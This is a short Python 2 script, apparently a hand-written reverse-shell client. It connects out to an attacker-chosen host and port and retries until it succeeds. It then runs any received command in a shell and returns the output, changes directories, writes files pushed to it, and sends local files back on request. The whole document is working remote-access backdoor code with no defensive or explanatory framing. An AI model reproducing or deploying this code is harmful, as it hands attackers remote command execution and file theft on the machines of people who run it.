#!/usr/bin/python

import socket
import threading
import subprocess
import sys
import os
import time

target_host = raw_input("set target host: ")
target_port = int(raw_input("set target port: ")) 
#target_host = "192.168.100.2"
#target_port = 444

def run_command(command):
	output = ''
	command = command.rstrip()
        #command = command + "; exit 0"
	output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	for line in iter(output.stdout.readline, ''):
		#line = line.replace('\n', '').replace('\r', '')
		#print line
		client.send(line)
		sys.stdout.flush()


while 1:
	
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	while 1:
		
		try:
			
			client.connect((target_host, target_port))
			break;

		except:
			pass

	while True:
		
		try:	
			
			#print "cmd recvd"
			cmd_buffer = client.recv(1024)
			#print cmd_buffer
						
			if cmd_buffer == "quit":
				client.close()
				os._exit(1)
			

			elif cmd_buffer == "close":
				client.close()
				os._exit(1)


			elif cmd_buffer == "exit":
				client.close()
				os._exit(1)


			elif ("cd" in cmd_buffer):
				cmd_buffer = cmd_buffer.replace("cd ", "" )
				os.chdir(cmd_buffer)
				client.send(os.getcwd())
			
			
			
			elif ("upload" in cmd_buffer):
				#print "entered"
				file = client.recv(1024)
				file = os.path.basename(file)
				#print "file name: %s" % file
				size = 1
	
				with open(file, 'wb') as f:
					
					while size:
						size = ''
						#print "entered"
						size = client.recv(4096)
						#print size
						if size == "#":
							break
						
					        f.write(size)

			elif ("download" in cmd_buffer):
				
				file = client.recv(1024)
				#print "file : %s" % file
				if os.path.isfile(file):
					#time.sleep(0.8)
					client.send('EXISTS')
					response = client.recv(1024)
					if response == 'OK':
					#	print "file opened.."
						with open(file, 'rb') as f:
							data = f.read(1024)
							client.send(data)
							while data != "":
								data = f.read(1024)
								client.send(data)
								#print "%s " % data

					#print "file sent!!"
					time.sleep(1)
					client.send("EOFEOFEOFX")
					#print "NULL sent"
	
				else: 
					client.send("ERR")

			else:

				run_command(cmd_buffer)
				client.send("#")	
		except Exception, e:
			#print "exception : %s" % e
			client.close()
			break
